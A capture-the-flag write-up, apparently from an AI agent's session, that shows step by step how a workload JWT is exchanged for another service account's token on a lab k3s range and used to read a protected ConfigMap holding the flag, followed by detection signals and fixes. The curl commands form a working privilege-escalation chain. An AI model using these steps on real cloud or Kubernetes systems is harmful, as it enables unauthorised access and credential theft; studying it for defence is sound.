# K14.2 — Intended for someone else

> **Category:** 2. KeplerOps · **Points:** 100 · **Difficulty:** medium
> **Solved by:** opencode/OC session (manual, in-session)

## Where this happens

![Range map — three segments, hosts and services](../docs/img/segments.png)

Primary service: `cloud-api.keplerops.test` for the role exchange, and the k3s API on `:6443`
for the protected role record ConfigMap `fieldlink/role-export-access`.

## At a glance

| | |
|---|---|
| **Vulnerability / bug class** | Over-broad token exchange: a workload JWT can be exchanged for an export role belonging to a different audience, and the role record is a readable ConfigMap |
| **Tools** | `curl`, `jq`; the k3s SelfSubjectRulesReview API |
| **Attack surface** | `POST /api/token-exchange/fieldkest-export-access`; `GET /api/v1/namespaces/fieldlink/configmaps/role-export-access` |
| **Prerequisite** | The workload JWT from K14.1's trust relationship (`svc-fieldlink-workload`) |
| **Flag** | `FLAG{f1aee508e418ac7c}` |

**What you are about to read:** the live exchange response, the export identity's real RBAC
scope, and the role record that carries the flag. This also corrects the earlier reconstruction:
the role record is **not** a `role_record` field in the exchange response; it is the ConfigMap
`role-export-access`.

## Objective

> Use the workload trust relationship to establish the scoped role intended for another audience
> and retrieve its protected role record.

The trust document from K14.1 names `fieldkest-export-access` as the export role. This card asks
what happens when the workload asks for that audience, and what the resulting identity can read.

## Background you need

A token exchange is a **downscoping** primitive: bring a token for audience A, ask for audience B,
receive a narrower credential. The security property is that the issued role must be bounded by
the **caller's identity**, not by the audience string in the URL.

Two common mistakes appear here:

1. The exchange reads the role name from the request path and mints it for any valid JWT.
2. The role record — the object describing what the role is for, who consumes it, and which scope
   it owns — sits in a ConfigMap that the resulting service account can read.

The second mistake is what turns the delegation graph into readable text, and then into a flag.

## Walkthrough

### 1. Start from the workload identity

The same exchange as K13.4/K14.1:

```bash
C="curl -sSk -m 20 --socks5-hostname 127.0.0.1:1080"
B=https://cloud-api.keplerops.test
K=https://cloud-api.keplerops.test:6443
U="rowan.ito:fk_developer_…"

WT=$($C -u "$U" -X POST \
  -H 'Content-Type: application/json' -d '{}' \
  "$B/api/workspaces/current/token-exchange" | jq -r .access_token)
```

The K14.1 trust document says this workload may reach `fieldkest-export-access`. Ask for it:

```bash
$C -X POST -H "Authorization: Bearer $WT" \
  -H 'Content-Type: application/json' -d '{}' \
  "$B/api/token-exchange/fieldkest-export-access"
```

```json
{
  "accepted_input_audience": "fieldkest-build-records",
  "access_token": "eyJhbGciOiJSUzI1NiIsImtpZCI6…",
  "audience": "fieldkest-export-access",
  "expires_in": 3600,
  "principal": "svc-fieldlink-export",
  "role": "role/support-export-editor",
  "schema": "fieldkest.role-session/v1"
}
```

The subject changed. We arrived as `svc-fieldlink-workload` and received a JWT whose `sub` is
`system:serviceaccount:fieldlink:svc-fieldlink-export`. The role is
`role/support-export-editor`, and the audience is exactly the one the trust document named.

`access_token` is a real k3s JWT. Store it:

```bash
EJ=$($C -X POST -H "Authorization: Bearer $WT" \
  -H 'Content-Type: application/json' -d '{}' \
  "$B/api/token-exchange/fieldkest-export-access" | jq -r .access_token)
```

Do not reuse the first response's token in a second exchange; treat each exchange as a session
and keep the token from the response you parsed.

### 2. Ask the export identity what it can do

Rather than guessing, SSRR:

```bash
$C -m 12 -X POST -H "Authorization: Bearer $EJ" \
  -H 'Content-Type: application/json' \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview",
       "spec":{"namespace":"fieldlink"}}' \
  "$K/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```

The rules that matter:

```json
[
  {"verbs": ["get"], "apiGroups": [""], "resources": ["configmaps"],
   "resourceNames": ["role-export-access"]},
  {"verbs": ["get"], "apiGroups": [""], "resources": ["configmaps"],
   "resourceNames": ["exp-2841-definition"]},
  {"verbs": ["patch"], "apiGroups": [""], "resources": ["configmaps"],
   "resourceNames": ["exp-2841-definition"]},
  {"verbs": ["get", "patch"], "apiGroups": ["batch"], "resources": ["cronjobs"],
   "resourceNames": ["sched-2841"]},
  {"verbs": ["get"], "apiGroups": ["batch"], "resources": ["jobs"],
   "resourceNames": ["exp-2841"]},
  {"verbs": ["create", "get"], "apiGroups": ["batch"], "resources": ["jobs"]},
  {"verbs": ["create"], "apiGroups": ["authorization.k8s.io"],
   "resources": ["selfsubjectaccessreviews", "selfsubjectrulesreviews"]}
]
```

This is the whole K15/K16 seam: one role record, one export definition (read/patch), one
schedule (read/patch), one export job (read), and the ability to create jobs. No secrets, no
pods, no logs.

### 3. Read the protected role record

```bash
$C -H "Authorization: Bearer $EJ" \
  "$K/api/v1/namespaces/fieldlink/configmaps/role-export-access"
```

The `data` object:

```json
{
  "accepted_input_audience": "fieldkest-build-records",
  "access_token": "FLAG{f1aee508e418ac7c}",
  "audience": "fieldkest-export-access",
  "principal": "svc-fieldlink-export",
  "role_id": "role/support-export-editor",
  "schema": "fieldkest.role-record/v1",
  "scope": "fieldkest-exports"
}
```

Labels:

```json
{"fieldkest.io/kind": "role-record"}
```

`access_token` is the flag. The record is exactly the delegation graph the card asks for:
`svc-fieldlink-export` consumes audience `fieldkest-export-access` through
`role/support-export-editor` in scope `fieldkest-exports`.

### 4. Submit

```text
submit.py K14.2 FLAG{f1aee508e418ac7c}
{"correct":true,"points_awarded":100,"attempt_number":4,"score":2690,"rank":23,"message":"Correct!"}
```

Attempt 4: three earlier values had been tried by other lanes. The evidence chain made the
mapping unambiguous: the role record is labeled `role-record`, named for the export audience, and
readable only with the export JWT.

## Why this works

The exchange authenticates the caller but **authorises on the path parameter**. The requested
audience (`fieldkest-export-access`) is an instruction. The service does not re-read the caller's
trust document to check that this audience is allowed, and it does not cap the resulting role at
the intersection with the caller's own rights. A general workload therefore becomes the export
service account.

The second half is the readable role record. Even if the record contained no token, it would
still enumerate the delegation: which audience maps to which role, and which scope the role
owns. Metadata that describes *who may act as whom* belongs in the same trust tier as the
credentials it governs — not in a ConfigMap readable by the resulting identity.

## Detection and fix

- **Signal:** exchange events where `caller_subject != issued_subject`; a workload exchanging for
  an audience it never uses; `svc-fieldlink-export` JWTs used from the workstation subnet instead
  of the export pod; reads of `role-*` ConfigMaps by the role they describe.
- **Fix:**
  1. Resolve the caller's service account, look up its allowed audiences in the trust record, and
     reject anything not listed.
  2. Cap the issued role at the intersection with the caller's maximum rights.
  3. Short TTLs and one audience per token.
  4. Move role records out of workload-readable ConfigMaps; drop any `access_token` from them.
  5. Rotate the export role; the output is a working JWT for `svc-fieldlink-export`.

## Notes and dead ends

- **Correction to the reconstruction:** the earlier K14.2 writeup guessed a `role_record` object
  inside the exchange response. The live response has no such field; it carries `role`,
  `principal`, `audience` and `schema`. The protected record is the ConfigMap
  `role-export-access`, read with the export JWT.
- Guessing API paths (`/api/roles/…`, `/api/role-records/…`) returns
  `authentication_required`; SSRR is what revealed the actual ConfigMap name.
- The same export JWT opens K15.1 `/api/exports/EXP-2841`, K15.2
  `/api/exports/EXP-2841/definition`, and K16.1 `/api/schedules/SCHED-2841`. Those flags are for
  their own cards; do not resubmit them here.
- The exchange is repeatable and returns a fresh `expires_in: 3600` token each time. The role
  record is stable across exchanges.
